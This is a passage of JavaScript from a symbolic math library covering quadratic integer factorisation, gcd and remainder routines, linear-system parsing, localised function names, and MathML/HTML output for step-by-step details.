      if (JSBI.equal(D, JSBI.BigInt(37)) && (JSBI.equal(p, JSBI.BigInt(7)) || JSBI.equal(p, JSBI.BigInt(14)) || JSBI.equal(p, JSBI.BigInt(3)) || JSBI.equal(p, JSBI.BigInt(11)))) {
        continue;
      } //?
      // http://oeis.org/wiki/Quadratic_integer_rings


      if (isPrime(p) && JSBI.notEqual(JSBI.remainder(D, p), JSBI.BigInt(0)) && JSBI.notEqual(p, JSBI.BigInt(2)) && LegendreSymbol(JSBI.toNumber(D), maybeJSBI.toNumber(p)) !== 1) {
        continue;
      } //?


      var i = quadraticIntegers(p, D, JSBI.BigInt(0)); //console.log(i + '');

      var x = v.truncatingDivide(i);

      if (x != null) {
        return this.equals(i) ? i : i.primeFactor();
      }

      var ic = i.conjugate();
      var x = v.truncatingDivide(ic);

      if (x != null) {
        return this.equals(ic) ? ic : ic.primeFactor();
      } // 1+9sqrt(2)
      //}

    } //console.log('!');


    return this; //throw new TypeError();
  };

  QuadraticInteger.prototype.toString = function () {
    var s = this.a.toString() + '+' + this.b.toString() + 'sqrt(' + this.D + ')';

    if (this.overTwo) {
      s = '(' + s + ')' + '/' + '2';
    }

    return s;
  };

  QuadraticInteger.prototype.isUnit = function () {
    var n = this.norm();
    return JSBI.equal(n, JSBI.BigInt(1)) || JSBI.equal(n, JSBI.unaryMinus(JSBI.BigInt(1)));
  };

  QuadraticInteger.prototype.equals = function (y) {
    var x = this;

    if (!(y instanceof QuadraticInteger)) {
      if (y.equals(Expression.ZERO)) {
        return JSBI.equal(x.a, JSBI.BigInt(0)) && JSBI.equal(x.b, JSBI.BigInt(0));
      }

      if (y.equals(Expression.ONE)) {
        return JSBI.equal(x.a, JSBI.BigInt(1)) && JSBI.equal(x.b, JSBI.BigInt(0));
      }

      throw new TypeError();
    }

    return maybeJSBI.equal(x.a, y.a) && maybeJSBI.equal(x.b, y.b) && maybeJSBI.equal(x.D, y.D) && maybeJSBI.equal(x.overTwo, y.overTwo);
  };

  QuadraticInteger.prototype.subtract = function (y) {
    var x = this;

    if (!maybeJSBI.equal(x.D, y.D)) {
      throw new TypeError();
    }

    var xa = x.a;
    var xb = x.b;
    var ya = y.a;
    var yb = y.b;

    if (maybeJSBI.notEqual(x.overTwo, y.overTwo)) {
      if (x.overTwo) {
        ya = JSBI.multiply(ya, JSBI.BigInt(2));
        yb = JSBI.multiply(yb, JSBI.BigInt(2));
      }

      if (y.overTwo) {
        xa = JSBI.multiply(xa, JSBI.BigInt(2));
        xb = JSBI.multiply(xb, JSBI.BigInt(2));
      }
    }

    return new QuadraticInteger(maybeJSBI.subtract(xa, ya), maybeJSBI.subtract(xb, yb), x.D, x.overTwo || y.overTwo);
  };

  QuadraticInteger.prototype.isDivisibleBy = function (y) {
    return this.truncatingDivide(y) != null;
  };

  QuadraticInteger.prototype.isDivisibleByInteger = function (x) {
    return x.truncatingDivide(this) != null;
  };

  QuadraticInteger.prototype.remainder = function (y) {
    if (!(y instanceof QuadraticInteger)) {
      if (y instanceof Expression.Multiplication && y.a instanceof Expression.Integer && y.b instanceof Expression.SquareRoot) {
        return this.remainder(new QuadraticInteger(Expression.ZERO.toBigInt(), y.a.toBigInt(), y.b.a.toBigInt()));
      }

      if (!(y instanceof Expression.Integer)) {
        throw new RangeError();
      }

      y = new QuadraticInteger(y.toBigInt(), Expression.ZERO.toBigInt(), this.D);
    }

    var x = this;

    if (!maybeJSBI.equal(x.D, y.D)) {
      throw new TypeError();
    }

    var n = x.multiply(y.conjugate());
    var d = y.norm();

    if (JSBI.equal(d, JSBI.BigInt(1)) || JSBI.equal(d, JSBI.unaryMinus(JSBI.BigInt(1)))) {
      // y.isUnit()
      return x.subtract(x);
    }

    var q1 = maybeJSBI.divide(maybeJSBI.subtract(n.a, maybeJSBI.remainder(n.a, d)), d);
    var q2 = maybeJSBI.divide(maybeJSBI.subtract(n.b, maybeJSBI.remainder(n.b, d)), d);

    if (JSBI.equal(q1, JSBI.BigInt(0)) && JSBI.equal(q2, JSBI.BigInt(0))) {
      //if (abs(x.norm()) >= abs(y.norm())) {
      //?
      if (maybeJSBI.greaterThan(x.a, y.a) && JSBI.greaterThan(y.a, JSBI.BigInt(0))) {
        return x.subtract(y.multiply(new QuadraticInteger(maybeJSBI.divide(maybeJSBI.subtract(x.a, maybeJSBI.remainder(x.a, y.a)), y.a), JSBI.BigInt(0), x.D)));
      }

      if (maybeJSBI.greaterThan(x.a, maybeJSBI.unaryMinus(y.a)) && JSBI.lessThan(y.a, JSBI.BigInt(0))) {
        return x.subtract(y.multiply(new QuadraticInteger(maybeJSBI.divide(maybeJSBI.subtract(x.a, maybeJSBI.remainder(x.a, maybeJSBI.unaryMinus(y.a))), maybeJSBI.unaryMinus(y.a)), JSBI.BigInt(0), x.D)));
      }

      if (JSBI.equal(y.b, JSBI.BigInt(0))) {
        return new QuadraticInteger(JSBI.BigInt(1), JSBI.BigInt(0), x.D); //?
      } //throw new RangeError("NotSupportedError");//TODO:!!!
      //}

    }

    var q = new QuadraticInteger(q1, q2, x.D);
    var r = x.subtract(y.multiply(q));
    return r;
  };

  QuadraticInteger.prototype.remainderInteger = function (x) {
    return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.D).remainder(this);
  };

  QuadraticInteger.prototype.toExpression = function () {
    return Expression.Integer.fromBigInt(this.a).add(Expression.Integer.fromBigInt(this.b).multiply(Expression.Integer.fromNumber(this.D).squareRoot())).divide(this.overTwo ? Expression.TWO : Expression.ONE);
  };

  QuadraticInteger.prototype.abs = function () {
    if (JSBI.lessThanOrEqual(this.a, JSBI.BigInt(0)) && JSBI.lessThanOrEqual(this.b, JSBI.BigInt(0)) || JSBI.lessThan(this.a, JSBI.BigInt(0)) && JSBI.greaterThan(this.norm(), JSBI.BigInt(0)) || JSBI.lessThan(this.b, JSBI.BigInt(0)) && JSBI.lessThan(this.norm(), JSBI.BigInt(0))) {
      return this.negate();
    }

    return this;
  }; //TODO: merge with the QuadraticInteger.toQuadraticInteger


  QuadraticInteger.prototype.isValid = function () {
    if (true) {//return false;
    }

    if (this.D === 5) {//return true;//TODO:!!!
    }

    if (this.D === 37) {//TODO: ?
      //return true;
    }

    if (this.D === 6) {
      //TODO: ?
      return false;
    }

    if (this.D % 4 === 1) {
      //TODO: ?
      return false;
    }

    if ([2, 3, 5, 6, 7, 11, 13, 17, 19, 21, 29, 33, 37, 41, 57, 73].indexOf(this.D) === -1) {
      // https://oeis.org/A048981
      return false;
    }

    return true;
  };

  QuadraticInteger.prototype.isPositive = function () {
    var qq = this;
    return JSBI.greaterThan(qq.a, JSBI.BigInt(0)) && JSBI.greaterThan(qq.b, JSBI.BigInt(0)) || JSBI.greaterThan(qq.a, JSBI.BigInt(0)) && JSBI.greaterThan(qq.norm(), JSBI.BigInt(0)) || JSBI.greaterThan(qq.b, JSBI.BigInt(0)) && JSBI.lessThan(qq.norm(), JSBI.BigInt(0));
  };

  self.QuadraticInteger = QuadraticInteger; //new QuadraticInteger(-67, 15, 37).primeFactor()
  // new QuadraticInteger(1, 1, 2).remainder(new QuadraticInteger(1, 1, 2))
  // new QuadraticInteger(2, 2, 2).truncatingDivide(new QuadraticInteger(2, 2, 2))

  function toQuadraticInteger(e) {
    //if (e instanceof Expression.Complex) {//!
    //  return e;
    //}
    // qq.a * qq.a + qq.D * qq.b * qq.b < Number.MAX_SAFE_INTEGER
    if (e instanceof Expression.Addition && e.b instanceof Expression.Integer && e.a instanceof Expression.SquareRoot && e.a.a instanceof Expression.Integer) {
      return new QuadraticInteger(e.b.toBigInt(), Expression.ONE.toBigInt(), e.a.a.toBigInt());
    }

    if (e instanceof Expression.Addition && e.b instanceof Expression.Integer && e.a instanceof Expression.Multiplication && e.a.a instanceof Expression.Integer && e.a.b instanceof Expression.SquareRoot && e.a.b.a instanceof Expression.Integer) {
      return new QuadraticInteger(e.b.toBigInt(), e.a.a.toBigInt(), e.a.b.a.toBigInt());
    }

    if (e instanceof Expression.Division) {
      if (e.getDenominator().equals(Expression.TWO)) {
        var tmp = toQuadraticInteger(e.getNumerator());

        if (tmp != null) {
          return tmp.truncatingDivide(new QuadraticInteger(2, 0, tmp.D));
        }
      }
    }
  } //!


  QuadraticInteger.toQuadraticInteger = toQuadraticInteger;

  QuadraticInteger.gcd = function (x, y) {
    var a = x;
    var b = y;

    while (!b.equals(Expression.ZERO)) {
      var r = a.remainder(b);

      if (!maybeJSBI.lessThanOrEqual(abs(r.norm()), abs(b.norm()))) {
        throw new TypeError("norm");
      }

      a = b;
      b = r;
    }

    return a;
  };
  /*
  QuadraticInteger.prototype.compareTo = function (e) {
    if (e === Expression.ZERO) {
      var n = this.a * this.a - this.b * this.b * this.D;
      return this.a === 0 && this.b === 0 ? 0 : (this.a < 0 && this.b < 0 || this.a < 0 && n > 0 || this.b < 0 && n < 0 ? -1 : 1);
    }
    if (e === Expression.ONE) {
      return this.a === 1 && this.b === 0 ? 0 : 1;
    }
    throw new TypeError();
  };
  */

  /*
  // http://oeis.org/wiki/Quadratic_integer_rings#Quadratic_integer_ring_with_discriminant_2
  var expected = {
    "2": {
      "1": "",
      "2": "0+1sqrt(2), 0+1sqrt(2)",
      "3": "3+0sqrt(2)",
      "4": "0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2)",
      "5": "5+0sqrt(2)",
      "6": "0+1sqrt(2), 0+1sqrt(2), 3+0sqrt(2)",
      "7": "3+1sqrt(2), 3+-1sqrt(2)",
      "8": "0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2)",
      "9": "3+0sqrt(2), 3+0sqrt(2)",
      "10": "0+1sqrt(2), 0+1sqrt(2), 5+0sqrt(2)",
      "11": "11+0sqrt(2)",
      "12": "0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 3+0sqrt(2)",
      "13": "13+0sqrt(2)",
      "14": "0+1sqrt(2), 0+1sqrt(2), 3+1sqrt(2), 3+-1sqrt(2)",
      "15": "3+0sqrt(2), 5+0sqrt(2)",
      "16": "0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2)",
      "17": "5+2sqrt(2), 5+-2sqrt(2)",
      "18": "0+1sqrt(2), 0+1sqrt(2), 3+0sqrt(2), 3+0sqrt(2)",
      "19": "19+0sqrt(2)",
      "20": "0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 0+1sqrt(2), 5+0sqrt(2)"
    }
  };
  
  var allFactors = function* (qi) {
    while (!qi.isUnit()) {
      var pf = qi.primeFactor();
      yield pf.toString();
      qi = qi.truncatingDivide(pf);
    }
    if (!/^1\+0sqrt\(\d+\)$/.test(qi.toString())) {
      yield qi.toString();
    }
  };
  for (var iteratorD = [2, 3, 5, 6, 7, 11, 13, 17, 19, 21, 29, 33, 37, 41, 57, 73][globalThis.Symbol.iterator](), D = iteratorD.next().value; D != null; D = iteratorD.next().value) {
    expected[D] = expected[D] || {};
    if (D === 3) debugger;
    for (var i = 1; i <= 20; i += 1) {
      expected[D][i] = Array.from(allFactors(new QuadraticInteger(i, 0, D))).join(', ');
      //console.log(i, Array.from(allFactors(new QuadraticInteger(i, 0, D))));
    }
    console.log(D, JSON.stringify(expected[D], null, 2));
  }
  debugger;
  throw new Error();
  */
  //

  /*
  
      if (n === 2) {
        var q = isQuadraticInteger(x);
        //TODO: (q.D === 2 || q.D === 3 || q.D === 5 || q.D === 17)
  
        if (q != null && q.D === 2 && Math.abs(q.a * q.a - q.b * q.b * q.D) === Math.pow(Math.gcd(q.a, q.b), 2)) {
          var ff = Expression.ONE;
          if (q.a % q.D === 0) {
            q = {
              a: q.b,
              b: Math.floor(q.a / q.D),
              D: q.D
            };
            ff = new SquareRoot(Integer.fromNumber(q.D));
            x = x.divide(ff);
          }
          var n = q.a * q.a - q.b * q.b * q.D;
          if (q.a > 0 && q.b > 0 || q.a > 0 && n > 0 || q.b > 0 && n < 0) {
            var t = new QuadraticInteger(q.a, q.b, q.D);
            if (t.primeFactor().equals(t)) {
              return (new SquareRoot(x.multiply(ff)));
            }
            var k1 = new QuadraticInteger(1, 0, q.D);
            var k2 = new QuadraticInteger(1, 0, q.D);
            var i = t;
            var p = null;
            while (!i.equals(Expression.ONE)) {
              var d = i.primeFactor();
              if (p == null) {
                p = d;
              } else {
                if (p.equals(d)) {
                  k1 = k1.multiply(d);
                  p = null;
                } else {
                  k2 = k2.multiply(p);
                  p = d;
                }
              }
              i = i.truncatingDivide(d);
            }
            if (p != null) {
              k2 = k2.multiply(p);
            }
            return k1.toExpression().multiply(new Expression.SquareRoot(k2.toExpression().multiply(ff)));
          }
        }
      }
  */

  /*
  
  
  
  // +1, -1, +i, -i
  // a+bi
  
  // a === 0, i*(a+bi)
  // a < 0, -(a+bi)
  // b < 0, i*(a+bi)
  
  // a > 0, b > 0
  
  
  /*
    for (var a = 1; a * a <= n; a += 1) {
      for (var b = 0; b * b <= n - a * a; b += 1) {
        if (norm(a, b) > 1n && hasDivisor(r, i, a, b)) {
          return [a, b];
        }
        if (norm(a, -b) > 1n && hasDivisor(r, i, a, -b)) {
          return [a, -b];
        }
      }
    }
    return [r, i];
  */


  function isPrime(n) {
    return maybeJSBI.equal(primeFactor(n), n);
  }
  /*
  
  function primeFactor(n) {
    var i = 2;
    var s = 0;
    var r = Math.floor(Math.sqrt(n + 0.5));
    while (i <= r) {
      if (n % i === 0) {
        return i;
      }
      i += s === 2 ? 2 : s + 1;
      s += 1;
      if (s === 4) {
        s = 2;
      }
    }
    return n;
  }
  
  function norm(x) {
    return x instanceof Expression.Integer ? x.multiply(x).value : x.multiply(x.conjugate()).value;
  }
  
  function checkFactorization(i) {
    var results = [];
    var x = i;
    while (norm(x) > 1) {
      var p = x.primeFactor();
      results.push(p);
  
      //A Gaussian integer a + bi is a Gaussian prime if and only if either:
      //  one of a, b is zero and absolute value of the other is a prime number of the form 4n + 3 (with n a nonnegative integer), or
      //  both are nonzero and a**2 + b**2 is a prime number (which will not be of the form 4n + 3).
      var n = norm(p);
      console.assert(isPrime(n) || ((p instanceof Expression.Integer || p.real.equals(Expression.ZERO) || p.imaginary.equals(Expression.ZERO)) && Math.abs(p instanceof Expression.Integer ? p : p.real.add(p.imaginary).value) % 4 === 3), n, p.toString());
  
      x = x.divide(p);
      if (x instanceof Expression.Integer && norm(x) > 1) {
        x = new Expression.Complex(Expression.ZERO, x);
      }
    }
    console.log(i + '=' + results.map(function (x) { return '(' + x + ')'; }).join(''));
  }
  
  
  // 5-5i
  
  checkFactorization(new Complex(new Expression.Integer(3), new Expression.Integer(3)));
  
  checkFactorization(new Complex(new Expression.Integer(0), new Expression.Integer(2)));
  checkFactorization(new Complex(new Expression.Integer(0), new Expression.Integer(-2)));
  checkFactorization(new Complex(new Expression.Integer(5), new Expression.Integer(1)));
  
  var A = 11;
  for (var i = -A; i <= A; i += 1) {
    for (var j = -A; j <= A; j += 1) {
      if (j !== 0) {
        checkFactorization(new Complex(new Expression.Integer(i), new Expression.Integer(j)));
      }
    }
  }
  
  
  */

  /*
            if (i == null && isOnePlusSqrtOf2(y.a)) {
              i = y.a;
            }
            if (i == null) {
              throw new TypeError();
            }
            } else if (isOnePlusSqrtOf2(y.a)) {
              if (!p.equals(y.a)) {
                throw new TypeError();
              }
              degree += 1;
  
  */
  // http://oeis.org/wiki/Quadratic_integer_rings
  // https://oeis.org/A048981
  // https://en.wikipedia.org/wiki/Euclidean_domain#Norm-Euclidean_fields
  // https://en.wikipedia.org/wiki/Fundamental_unit_(number_theory)
  // https://en.wikipedia.org/wiki/Pell%27s_equation
  // https://en.wikipedia.org/wiki/Diophantine_equation
  // https://ru.wikipedia.org/wiki/Ð“Ð°ÑƒÑÑÐ¾Ð²Ñ‹_Ñ†ÐµÐ»Ñ‹Ðµ_Ñ‡Ð¸ÑÐ»Ð°#ÐžÐ¿Ñ€ÐµÐ´ÐµÐ»ÐµÐ½Ð¸Ðµ
  // https://en.wikipedia.org/wiki/Gaussian_integer
  // https://en.wikipedia.org/wiki/Prime_element


  globalThis.QuadraticInteger = QuadraticInteger; // ExpressionParser.parse('((17^0.5+7)**3)**(1/3)') + ''
  // new QuadraticInteger(7, 1, 17).remainder(new QuadraticInteger(3, 1, 17))

  QuadraticInteger._checkFactorization = function checkFactorization(i) {
    if (typeof i === "string") {
      i = QuadraticInteger.toQuadraticInteger(RPN(i));
    }

    var results = [];
    var x = i;

    while (Math.abs(maybeJSBI.toNumber(x.norm())) > 1) {
      //debugger;
      var p = x.primeFactor();
      results.push(p);
      x = x.truncatingDivide(p);
    }

    if (x.a.toString() !== '1' || x.b.toString() !== '0') {
      results.unshift(x);
    }

    console.log(i + '=' + results.map(function (x) {
      return '(' + x.toString() + ')';
    }).join(''));
  };
})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2, white: true */

/*global i18n, Condition, ExpressionParser, Polynomial, Expression, Matrix, NonSimplifiedExpression*/
var RPN = ExpressionParser.parse; //TODO: fix

RPN.Context = ExpressionParser.Context;

var polynomialToExpression3 = function (matrix, row, variableSymbols) {
  var pivotColumn = 0;

  while (pivotColumn < matrix.cols() - 1 && matrix.e(row, pivotColumn).equals(Expression.ZERO)) {
    pivotColumn += 1;
  }

  if (pivotColumn === matrix.cols() - 1) {
    throw new TypeError();
  }

  var result = undefined;

  for (var i = pivotColumn; i < matrix.cols() - 1; i += 1) {
    var c = i === pivotColumn ? matrix.e(row, matrix.cols() - 1) : matrix.e(row, i).negate();
    var v = i === pivotColumn ? undefined : variableSymbols[i];

    if (!c.equals(Expression.ZERO)) {
      var current = v == undefined ? c : c.equals(Expression.ONE) ? v : new Expression.Multiplication(c, v);
      result = result == undefined ? current : new Expression.Addition(result, current);
    }
  }

  return result == undefined ? Expression.ZERO : result;
};

RPN.toMathML = function (input, printOptions) {
  return ExpressionParser.parse(input, new ExpressionParser.Context()).toMathML(printOptions);
}; //Note: matrixTableState.inputValues were filled by `getInputValue`


RPN.getElementsArray = function (matrixTableState) {
  var mode = matrixTableState.mode;
  var type = matrixTableState.type;
  var textareaValue = matrixTableState.textareaValue;
  var inputValues = matrixTableState.inputValues;

  if (mode !== "cells") {
    //?
    //!!!
    if (type === "system") {
      // to support custom input in SLE: 3x+y-2z=2; 2x+y-1=3; ...
      if (/\=/.exec(textareaValue) != undefined) {
        //?
        try {
          var tmp = getAugmentedSystemMatrix(textareaValue);

          if (tmp != undefined) {
            return tmp;
          }
        } catch (error) {
          console.log(error);
        }
      }
    } //!!!


    var resultRows = Matrix.split(textareaValue);
    return {
      elements: resultRows,
      variableNames: undefined
    }; // the user, probably, does not expecte varible names, and matrixTableState.variableNames contains less number of variables
  }

  return {
    elements: inputValues,
    variableNames: matrixTableState.variableNames
  };
};

var getSymbols = function (e) {
  if (e instanceof Expression.Symbol) {
    return [e];
  }

  if (e instanceof Expression.Integer) {
    return [];
  }

  if (e instanceof Expression.Complex) {
    return [];
  }

  if (e instanceof Expression.BinaryOperation) {
    var sa = getSymbols(e.a);
    var sb = getSymbols(e.b);
    return sa != null && sb != null ? sa.concat(sb) : null;
  }

  if (e instanceof Expression.Function) {
    return getSymbols(e.a);
  }

  return null;
};

var getAugmentedSystemMatrix = function (s) {
  //!2018-07-16
  s = s.replace(/[;\r]|,(?!\d)/g, "\n"); //!

  var lines = s.split("\n");
  var k = -1;
  var rows = [];
  var frees = [];
  var variableToColumnNumberMap = {}; // string -> number

  var columnNumberToVariableMap = []; // number -> string

  var free = undefined;
  var row = undefined;

  var onVariable = function (coefficient, variable) {
    if (variable === "") {
      free = free.add(coefficient);
    } else {
      var columnIndex = variableToColumnNumberMap[variable];

      if (columnIndex == undefined) {
        columnIndex = columnNumberToVariableMap.length;
        variableToColumnNumberMap[variable] = columnIndex;
        columnNumberToVariableMap.push(variable);
      }

      while (row.length < columnIndex + 1) {
        row.push(Expression.ZERO);
      }

      row[columnIndex] = row[columnIndex].add(coefficient);
    }
  };

  var cvLists = new Array(lines.length);
  RPN.p = 0; //!

  while (++k < lines.length) {
    cvLists[k] = undefined;
    var line = lines[k];
    var x = line.split("=");

    if (x.length === 2) {
      //TODO: fix
      var leftString = x[0];
      var rightString = x[1];
      var left = ExpressionParser.parse(leftString);
      RPN.p += leftString.length;
      RPN.p += "=".length;
      var right = ExpressionParser.parse(rightString);
      RPN.p += rightString.length;
      RPN.p += "\n".length;
      var y = left.subtract(right).getNumerator();
      cvLists[k] = Expression.collectLinearEquationVariables(y);
    } else {
      RPN.p += line.length + "\n".length;

      if (line.replace(/^\s+|\s+$/g, "") !== "") {
        // to skip empty lines
        return undefined;
      }
    }
  } // second pass:


  var nonVariableSymbols = {};

  for (var i = 0; i < cvLists.length; i += 1) {
    if (cvLists[i] != undefined) {
      var list = cvLists[i];

      for (var j = 0; j < list.length; j += 1) {
        var symbols = getSymbols(list[j].c);

        if (symbols == null) {
          // `getSymbols` does not support this expression
          return undefined;
        }

        for (var k = 0; k < symbols.length; k += 1) {
          nonVariableSymbols[symbols[k]] = true;
        }
      }
    }
  }

  for (var i = 0; i < cvLists.length; i += 1) {
    if (cvLists[i] != undefined) {
      var list = cvLists[i];

      for (var j = 0; j < list.length; j += 1) {
        if (nonVariableSymbols[list[j].v] === true) {
          list[j] = {
            c: list[j].c.multiply(new Expression.Symbol(list[j].v)),
            v: ""
          };
        }
      }
    }
  }

  for (var i = 0; i < cvLists.length; i += 1) {
    if (cvLists[i] != undefined) {
      row = [];
      free = Expression.ZERO;
      var list = cvLists[i];

      for (var j = 0; j < list.length; j += 1) {
        onVariable(list[j].c, list[j].v);
      }

      frees.push(free);
      rows.push(row);
    }
  }

  var a = -1;

  while (++a < rows.length) {
    row = rows[a];

    while (row.length < columnNumberToVariableMap.length) {
      row.push(Expression.ZERO);
    }

    row.push(frees[a].negate());
  }

  var b = -1;

  while (++b < rows.length) {
    row = rows[b];
    var c = -1;

    while (++c < row.length) {
      row[c] = row[c].toString(); //!slow?
    }
  } //!TODO: fix: reverse variables and coefficients, as Expression.collectLinearEquationVariables gives wrong order


  b = -1;

  while (++b < rows.length) {
    row = rows[b];
    var f = -1;
    var d = row.length - 1; // skipping free

    while (++f < --d) {
      var tmp = row[f];
      row[f] = row[d];
      row[d] = tmp;
    }
  }

  var newColumnNumberToVariableMap = []; // number -> Expression

  b = -1;

  while (++b < columnNumberToVariableMap.length) {
    newColumnNumberToVariableMap.push(columnNumberToVariableMap[columnNumberToVariableMap.length - 1 - b]);
  }

  columnNumberToVariableMap = newColumnNumberToVariableMap; //!

  return {
    elements: rows,
    variableNames: columnNumberToVariableMap
  };
};

Matrix.toMatrix = function (array) {
  var context = new ExpressionParser.Context();
  return Matrix.padRows(array, function (e) {
    return ExpressionParser.parse(e, context);
  });
}; // ---------------------------------------i18n.js-----------------------------------------
// see https://www.w3.org/TR/2006/NOTE-arabic-math-20060131/#Persian
// and https://en.wikipedia.org/wiki/Modern_Arabic_mathematical_notation#Mathematical_letters
// https://ru.wikipedia.org/wiki/Ð’Ð¸ÐºÐ¸Ð¿ÐµÐ´Ð¸Ñ:Ð¤Ð¾Ñ€Ð¼ÑƒÐ»Ñ‹#:~:text=Ð²%20Ñ€ÑƒÑÑÐºÐ¾Ð¹%20Ñ‚Ñ€Ð°Ð´Ð¸Ñ†Ð¸Ð¸%20Ð¼Ð½Ð¾Ð³Ð¸Ðµ%20Ñ‚Ñ€Ð¸Ð³Ð¾Ð½Ð¾Ð¼ÐµÑ‚Ñ€Ð¸Ñ‡ÐµÑÐºÐ¸Ðµ%20Ð¸%20Ð³Ð¸Ð¿ÐµÑ€Ð±Ð¾Ð»Ð¸Ñ‡ÐµÑÐºÐ¸Ðµ%20Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¸%20Ð¾Ð±Ð¾Ð·Ð½Ð°Ñ‡Ð°ÑŽÑ‚ÑÑ%20Ð¸Ð½Ð°Ñ‡Ðµ
// i18n.rankDenotation
// i18n.sinDenotation
// i18n.tanDenotation
// TODO: denotations on the main page in information
// 'ar-u-nu-arab' === arz (as on Wikipedia) - ?


var denotationsByOperation = {
  sqrt: {
    de: "wurzel"
  },
  rank: {
    bg: "Ñ€Ð°Ð½Ð³",
    de: "rang",
    en: "rank",
    es: "rango",
    fr: "rg",
    gl: "rango",
    it: "rango",
    nl: "rang",
    pt: "posto",
    tr: "rank"
  },
  transpose: {
    es: "traspuesta"
  },
  determinant: {
    pt: "determinante"
  },
  sin: {
    'ar-u-nu-arab': "Ø­Ø§â€Žâ€Ž",
    es: "sen"
  },
  cos: {
    'ar-u-nu-arab': "Ø­ØªØ§â€Žâ€Žâ€Ž"
  },
  tan: {
    'ar-u-nu-arab': "Ø·Ø§â€Ž",
    ru: "tg",
    fr: "tg"
  },
  cot: {
    'ar-u-nu-arab': "Ø·ØªØ§â€Žâ€Žâ€Žâ€Ž",
    ru: "ctg"
  },
  sinh: {
    'ar-u-nu-arab': "Ø­Ø§Ø²",
    es: "senh",
    pt: "senh",
    ru: 'sh'
  },
  cosh: {
    'ar-u-nu-arab': "Ø­ØªØ§Ø²â€Ž",
    ru: 'ch'
  },
  tanh: {
    'ar-u-nu-arab': "Ø·Ø§Ø²â€Ž",
    ru: 'th'
  },
  coth: {
    'ar-u-nu-arab': 'Ø·ØªØ§Ø²â€Ž',
    ru: 'cth'
  },
  arctan: {
    ru: 'arctg'
  },
  arccot: {
    ru: 'arcctg'
  },
  arsinh: {
    ru: 'arsh'
  },
  arcosh: {
    ru: 'arch'
  },
  artanh: {
    ru: 'arth'
  },
  arcoth: {
    ru: 'arcth'
  }
};
ExpressionParser.addDenotations(denotationsByOperation);
var lang = document.documentElement.lang;

for (var name in denotationsByOperation) {
  if (Object.prototype.hasOwnProperty.call(denotationsByOperation, name)) {
    Expression.denotations[name] = denotationsByOperation[name][lang];
  }
}

Expression.denotations["log"] = "ln"; //!

Expression.denotations["determinant"] = "det"; //!

Expression.denotations["adjugate"] = "adj"; //!
// --------------------------------------------- end ----------------------------------------------

var getResultAndHTML = function (expression, variableNames, result, printOptions) {
  // TODO: fix
  var resultHTML = "";

  if (result instanceof Expression.NoAnswerExpression) {
    var name = result.name;
    var matrix = result.a.matrix;
    var second = result.second; //!
    //result = undefined;

    if (name === "solve") {
      resultHTML = ""; //TODO:
    } else {
      resultHTML = Expression.Details.getCallback(name)(printOptions, matrix, second == undefined ? variableNames : second);
    }
  } else if (result instanceof Expression.Equality) {
    //TODO: counter
    resultHTML = "";
    resultHTML += "<div>" + "<math>" + expression.toMathML(printOptions) + "</math>" + "</div>";
    resultHTML += "<div>" + "<math>" + result.toMathML(printOptions) + "</math>" + "</div>";
  } else {
    resultHTML = "<math>" + expression.toMathML(printOptions) + "<mo>=</mo>" + result.toMathML(printOptions) + "</math>";
  }

  return {
    result: result,
    html: resultHTML
  };
}; //? bestMethodsLimit - with highest priority


var createDetailsSummary = function (idPrefix, details, bestMethodsLimit) {
  bestMethodsLimit = bestMethodsLimit == undefined ? 1 : bestMethodsLimit;
  var s = "";

  for (var j = 0; j < details.length; j += 1) {
    //TODO: FIX
    //var rows = details[j].matrix.split("},").length;
    var countRows = function (s) {
      var state = 0;
      var result = 1;

      for (var i = 0; i < s.length; i += 1) {
        var c = s.charCodeAt(i);

        if (c === ",".charCodeAt(0)) {
          if (state === 1) {
            result += 1;
          }
        } else if (c === "{".charCodeAt(0)) {
          state += 1;
        } else if (c === "}".charCodeAt(0)) {
          state -= 1;
        }
      }

      return result;
    };

    var rows = countRows(details[j].matrix); //TODO: what if some `type` was provided?

    var type = details[j].type;
    var items = [];
    var edetails = Expression.Details.getAll(type, rows);

    for (var i = 0; i < edetails.length; i += 1) {
      var x = edetails[i];
      var jsonObject = {
        type: x.type,
        matrix: details[j].matrix,
        second: details[j].second
      }; // It is needed to use an individual prefix to have unique ids (consider if Expression.idCounter was reset after reload)

      var detailsIdPrefix = idPrefix + '-' + 'd' + i; //TODO: Tree View - ?

      var item = "" + "<details data-id-prefix=\"" + detailsIdPrefix + "\" " + "data-details=\"" + Expression.escapeHTML(JSON.stringify(jsonObject)) + "\"" + ">" + "<summary>" + i18n.misc.summaryLabel + (x.i18n != undefined ? " (" + x.i18n() + ")" : "") + "</summary>" + ('activeElement' in document ? "<div class=\"indented\"></div>" : "<a class=\"indented\"></a>") + "</details>";
      items.push(item);
    }

    var groupId = idPrefix + "-" + Expression.id();

    if (items.length > bestMethodsLimit + 1) {
      s += items.slice(0, bestMethodsLimit).join("");
      s += "<div id=\"" + groupId + "\" role=\"group\" hidden>";
      s += items.slice(bestMethodsLimit).join("");
      s += "</div>";
      s += "<button type=\"button\" class=\"more-button\" aria-expanded=\"false\" aria-controls=\"" + groupId + "\">&hellip;</button>";
    } else {
      s += items.join("");
    }
  }

  return s;
};

Expression.Minor = function (matrix, i, j) {
  Expression.Determinant.call(this, matrix);
  this.i = i;
  this.j = j;
};

Expression.Minor.prototype = Object.create(Expression.Determinant.prototype);

Expression.Minor.prototype.toMathML = function (options) {
  options = Object.assign({}, options, {
    horizontalStrike: this.i,
    verticalStrike: this.j,
    useBraces: ["|", "|"]
  }); //TODO: fix

  return this.a.toMathML(options);
};

Expression.p = function (s, args, printOptions) {
  if (typeof s === "number") {
    return Expression.Integer.fromNumber(s).toMathML(printOptions);
  }

  if (args == null && printOptions != null || args != null && printOptions == null) {
    throw new TypeError();
  }

  args = args || null;
  printOptions = printOptions || null;
  var result = "";
  var parts = s.split("=");

  for (var i = 0; i < parts.length; i += 1) {
    var e = ExpressionParser.parse(parts[i], new ExpressionParser.Context(function (id) {
